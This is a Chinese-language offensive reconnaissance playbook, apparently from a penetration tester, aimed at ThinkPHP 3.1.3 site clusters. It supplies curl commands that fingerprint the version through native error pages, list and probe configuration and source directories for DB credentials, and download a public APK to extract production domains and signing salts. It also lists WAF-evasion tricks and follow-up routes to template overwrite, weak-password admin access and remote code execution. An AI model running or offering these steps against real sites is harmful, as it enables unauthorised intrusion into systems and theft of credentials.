# ThinkPHP 3.1.3 站群：版本泄露 + 目录列举 + APK 公开下载（前置情报三件套）

适用：SomCNS 家族 ThinkPHP 3.1.3 站群（宝塔/nginx + PHP-FPM，多 vhost）。全程零 Cookie、零凭据。

## ① /Help/ 原生错误页 → 版本 + 内部路径

```bash
curl -k -s --noproxy '*' "https://TARGET/Help/" | grep -oE 'ThinkPHP[[:space:]]*[0-9.]+' | head -1
# 命中：ThinkPHP 3.1.3
```

- 判据：HTTP 200 且正文是 ThinkPHP 原生异常页（页脚 `ThinkPHP 3.1.3`，正文常带 `模板不存在[/www/wwwroot/<项目>/App/Tpl/...]`、`think_page_trace` 的查询数与绝对路径）。
- 同族其它触发法（/Help/ 不通时依次试）：
  ```bash
  curl -k -s "https://TARGET/User"
  curl -k -s "https://TARGET/index.php?g=Home&m=Pay&a=index"
  curl -k -s "https://TARGET/index.php/Help/"
  ```
  任意不存在/异常路由都可能出原生错误页。

## ② 应用目录可直接列举

```bash
for d in Conf App Runtime Public Upload wapdown images; do
  printf '%-8s ' "$d"
  curl -k -s -o /dev/null -w '%{http_code} %{size_download}\n' "https://TARGET/$d/"
done
```

- `Conf`：配置目录（`config.db.php` / `config.site.php` 里是 DB 连接串，能读到源码即可升为高危）
- `App`：`App/Lib/Action/**/*Action.class.php` 控制器源码面（配合 `App/Tpl/**` 模板零凭证直读）
- `Runtime`：编译缓存（`~runtime.php`、`App/Runtime/Cache/**`），是模板烘焙链的落地目录
- `Upload` / `wapdown` / `images`：上传与分发目录，找已上传的 html/zip/安装包

判据：200 且出现目录索引（`Index of /`）；若无索引但已知文件名，则必须做**存在性对照**（同一 URL 返回源码/二进制 vs 返回首页体积，两者体积相同即 nginx try_files 兜底的软 404，不能算列举）。

## ③ /wapdown/app.apk 匿名下载

```bash
curl -k -sI --noproxy '*' "https://TARGET/wapdown/app.apk"
# 期望：200 + Content-Type: application/vnd.android.package-archive + Content-Length 十几 MB
curl -k -s --noproxy '*' -o app.apk "https://TARGET/wapdown/app.apk"
file app.apk          # 期望 Zip archive / Android package, PK\x03\x04
ls -l app.apk         # 与 Content-Length 对齐
```

包内情报（不装、只静态看）：

```bash
unzip -l app.apk | head -40
strings app.apk | grep -Eo 'https?://[A-Za-z0-9._/-]+' | sort -u | head -80
# 有 apktool/aapt 时：apktool d -f app.apk -o apk_out && grep -rIl 'http' apk_out | head
```

- 产出：生产 API 域名 / 备用线路域名 / 渠道号 / 签名盐 / 包名，是横向扩面（另一套后台、另一批 vhost）的起点。
- 大包建议 `curl -r 0-1048575` 先取头验证魔数与真实文件，再整包下载；注意别把站点带宽打满。

## 判据汇总（必须逐条落实，不做推断）

| 面 | 成立条件 | 不成立的样子 |
|---|---|---|
| 版本泄露 | `/Help/` 200 且页面正文含 `ThinkPHP 3.1.3` | 200 但是站点首页 / 自定义 404 |
| 目录列举 | 200 且 `Index of /`，或已知文件名能拿到真实内容 | 200 返回首页同体积（软 404） |
| APK 公开 | 200 + `PK\x03\x04` + 大小=Content-Length | 200 但 body 是 HTML 错误页 |

## 失败时的常见原因

1. `/Help/` 返回 404：该安装删了 Help 模块 → 用 `/User`、`?g=Home&m=Pay&a=index`、`/index.php/<不存在控制器>` 换触发点。
2. 目录全 200 但都是首页：nginx `try_files` 兜底 → 必须用具体文件名做对照；再看 `Content-Length` 是否与首页完全一致。
3. `/App`、`/Conf` 被宝塔/WAF 拦（403 或空 body）：换 UA、去掉尾部斜杠、大小写混合、URL 编码关键字；仍拦就只走 `/Help/` 与 `/wapdown/` 两条。
4. APK 403/404：真实文件名不叫 `app.apk` → 先从 `/wapdown/` 目录索引或首页下载按钮的 `href` 里取准确名字。
5. APK 只有几十 KB：多为分片/热更壳包或下载跳转页，读 `Location` 或包内配置里的真实基址再取。

## 影响与后续衔接

- 锁定 3.1.3 后可精确匹配已知面：`Home/Order::get_html1` 零凭证覆盖模板、`think_page_trace` 泄内部路径、`/App/**/*.class.php` 尾斜杠交 PHP-FPM 执行回显绝对路径。
- 目录列举拿到的 `Conf/*.php`（DB 凭据）、`App/Tpl/Admin/**`（后台菜单）、`App/Lib/Action/**`（控制器源码）可直接支撑后台/弱口令/RCE 路线。
- APK 内的生产域名与渠道配置用于扩面（同运营方其它 vhost / 另一平台后台）。
